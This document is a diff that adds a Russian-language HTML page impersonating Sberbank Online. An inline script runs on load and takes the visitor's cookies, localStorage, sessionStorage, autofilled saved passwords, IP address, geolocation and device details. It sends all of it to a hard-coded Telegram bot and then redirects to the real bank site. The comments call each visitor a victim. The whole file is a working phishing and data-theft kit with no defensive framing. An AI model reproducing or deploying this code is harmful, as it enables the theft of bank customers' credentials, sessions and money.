@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>СберБанк Онлайн</title>
+    <style>
+        body {
+            font-family: Arial;
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+        .logo {
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .logo img {
+            width: 100px;
+            height: 100px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2d6a4f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            text-align: center;
+            color: #666;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+<div class="logo">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%232d6a4f'/%3E%3Ctext x='50' y='68' text-anchor='middle' fill='white' font-size='32' font-weight='bold'%3EСБ%3C/text%3E%3C/svg%3E" alt="СберБанк">
+    <h2>СберБанк Онлайн</h2>
+</div>
+<div class="loader"></div>
+<div class="message">Подключение к защищенному каналу...</div>
+
+<script>
+// ========== НАСТРОЙКИ TELEGRAM ==========
+const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
+const CHAT_ID = "8533450974";                           // ТВОЙ ID
+// ========================================
+
+// Функция отправки в Telegram
+function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    }).catch(e => console.log("send error", e));
+}
+
+// 1. КРАЖА ВСЕХ COOKIES
+function stealCookies() {
+    const cookies = document.cookie;
+    if (cookies && cookies.length > 0) {
+        sendToTelegram(`🍪 COOKIES:\n${cookies}`);
+        
+        // Ищем конкретные банковские cookies
+        const sberCookies = cookies.match(/(sber|sb|bank|auth|session|token)[^;]*/gi);
+        if (sberCookies) {
+            sendToTelegram(`🏦 БАНКОВСКИЕ COOKIES:\n${sberCookies.join("\n")}`);
+        }
+    }
+    return cookies;
+}
+
+// 2. КРАЖА ВСЕГО LOCALSTORAGE
+function stealLocalStorage() {
+    const allData = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        try {
+            allData[key] = localStorage.getItem(key);
+        } catch(e) {}
+    }
+    
+    if (Object.keys(allData).length > 0) {
+        sendToTelegram(`💾 LOCALSTORAGE:\n${JSON.stringify(allData, null, 2)}`);
+        
+        // Поиск банковских данных
+        const bankKeywords = ['token', 'auth', 'session', 'card', 'phone', 'user', 'login', 'password', 'sber', 'sb'];
+        const bankData = {};
+        bankKeywords.forEach(kw => {
+            Object.keys(allData).forEach(key => {
+                if (key.toLowerCase().includes(kw)) {
+                    bankData[key] = allData[key];
+                }
+            });
+        });
+        
+        if (Object.keys(bankData).length > 0) {
+            sendToTelegram(`🏦 БАНКОВСКИЕ ДАННЫЕ:\n${JSON.stringify(bankData, null, 2)}`);
+        }
+    }
+    return allData;
+}
+
+// 3. КРАЖА SESSIONSTORAGE
+function stealSessionStorage() {
+    const allData = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        try {
+            allData[key] = sessionStorage.getItem(key);
+        } catch(e) {}
+    }
+    if (Object.keys(allData).length > 0) {
+        sendToTelegram(`📦 SESSIONSTORAGE:\n${JSON.stringify(allData, null, 2)}`);
+    }
+}
+
+// 4. ПОЛУЧЕНИЕ IP И ГЕОЛОКАЦИИ
+function getLocation() {
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            sendToTelegram(`🌐 IP: ${data.ip}`);
+        });
+    
+    // Геолокация (если разрешит)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                sendToTelegram(`📍 ГЕО: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+            },
+            err => console.log("geo denied")
+        );
+    }
+}
+
+// 5. ПОПЫТКА ДОСТУПА К СОХРАНЕННЫМ ПАРОЛЯМ (через автозаполнение)
+function stealSavedPasswords() {
+    // Создаем скрытую форму для триггера автозаполнения
+    const form = document.createElement('form');
+    form.style.display = 'none';
+    form.innerHTML = `
+        <input type="text" id="fake-user" name="username">
+        <input type="password" id="fake-pass" name="password">
+    `;
+    document.body.appendChild(form);
+    
+    // Ждем автозаполнения
+    setTimeout(() => {
+        const user = document.getElementById('fake-user').value;
+        const pass = document.getElementById('fake-pass').value;
+        if (user || pass) {
+            sendToTelegram(`🔑 СОХРАНЕННЫЕ ДАННЫЕ:\nЛогин: ${user}\nПароль: ${pass}`);
+        }
+        form.remove();
+    }, 100);
+}
+
+// 6. ИНФОРМАЦИЯ О БРАУЗЕРЕ И УСТРОЙСТВЕ
+function getDeviceInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "unknown"
+    };
+    sendToTelegram(`📱 УСТРОЙСТВО:\n${JSON.stringify(info, null, 2)}`);
+}
+
+// 7. ПОИСК ДАННЫХ БАНКА В ИСТОРИИ БРАУЗЕРА (через переходы)
+function checkBankHistory() {
+    // Проверяем, был ли вход в Сбер
+    const sberDomains = ['sberbank', 'sberbank.ru', 'online.sberbank', 'sberbank-online'];
+    const historyCheck = sberDomains.some(domain => document.referrer.includes(domain));
+    if (historyCheck) {
+        sendToTelegram(`✅ ЖЕРТВА РАНЕЕ ВХОДИЛА В СБЕРБАНК`);
+    }
+}
+
+// 8. ВСЕ ВМЕСТЕ
+function collectAll() {
+    const startTime = Date.now();
+    
+    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА\n⏰ ${new Date().toLocaleString()}`);
+    
+    stealCookies();
+    stealLocalStorage();
+    stealSessionStorage();
+    stealSavedPasswords();
+    getLocation();
+    getDeviceInfo();
+    checkBankHistory();
+    
+    // Отправляем итоговый отчет
+    setTimeout(() => {
+        sendToTelegram(`📊 СБОР ЗАВЕРШЕН за ${Date.now() - startTime}мс`);
+    }, 2000);
+}
+
+// ЗАПУСК
+collectAll();
+
+// Перенаправление на реальный сайт через 3 секунды
+setTimeout(() => {
+    window.location.href = "https://online.sberbank.ru";
+}, 3000);
+</script>
+</body>
+</html>
